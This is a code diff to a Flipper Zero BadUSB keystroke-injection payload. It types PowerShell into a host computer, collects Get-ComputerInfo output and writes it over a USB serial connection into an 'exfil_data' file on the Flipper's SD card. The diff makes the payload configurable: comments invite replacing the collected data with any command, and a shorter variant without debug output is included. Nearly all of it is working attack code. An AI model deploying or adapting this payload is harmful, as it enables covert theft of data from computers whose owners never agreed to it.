@@ -13,9 +13,23 @@ DELAY 500
 ENTER
 DELAY 750
 
-REM Flipper will inject the inline powershell and run it.
-REM The powershell starts with a delay. This is to give you time to hit BACK twice on the Flipper to get it out of BadUSB mode. Otherwise it won't save data
-REM After the delay, the script will try to determine which COM port the Flipper is plugged into and will write a string to the specified file path.
+REM The powershell starts with a delay. This is to give you time to hit BACK twice on the Flipper to get it out of BadUSB mode. Otherwise it wont save data.
+REM If the normal FZ mode is detected, the script will determine which COM port the Flipper is plugged in and write a string to the specified path/file.
 
-ALTSTRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly|Where{$_.InstanceID -match 'USB\\VID_0483\&PID_5740' -and $_.Class -eq "Ports"}) -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write /ext/apps_data/exfil_data`r`n");$p.Write("Hello World!");$p.Write("$([char] 3)");$p.Close();break}Catch{If(Get-PNPDevice -PresentOnly|Where {$_.InstanceID -match 'HID\\VID_046D\&PID_C529'}){"BadUSB"}Else{"NoFZ";Start-Sleep 4};Start-Sleep 1}}
+REM ## Command to execute/data to extract. Don't forget cast to string. 
+ALTSTRING $d=(Get-ComputerInfo|Out-String);
+
+REM ## The VendorID and ProductID to search. If you'd change the BadUSB IDs in this script, you need to change $BHID as well.
+ALTSTRING $BHID="HID\\VID_046D\&PID_C529";
+ALTSTRING $SUSB="USB\\VID_0483\&PID_5740";
+REM Teh trorage Path where the result is SPATHed at the Flipper Zero SD card
+ALTSTRING $SPATH="/ext/apps_data/exfil_data"
+ENTER
+
+DELAY 1000
+REM ## Perform 600 loops, to check if BadUSB is still active, wait 1 sec. If the Flipper is just disconnected, the loop will wait 4 sec.
+ALTSTRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly|Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"}) -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{If(Get-PNPDevice -PresentOnly|Where {$_.InstanceID -match $BHID}){"BadUSB"}Else{"NoFZ";Start-Sleep 4};Start-Sleep 1}}
+REM ## Shorter Version, without debug output, no 4 Sec delay
+REM ALTSTRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly -Class 'Ports' -InstanceID 'USB\VID_0483&PID_5740*') -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{Sleep 1}}
+
 ENTER
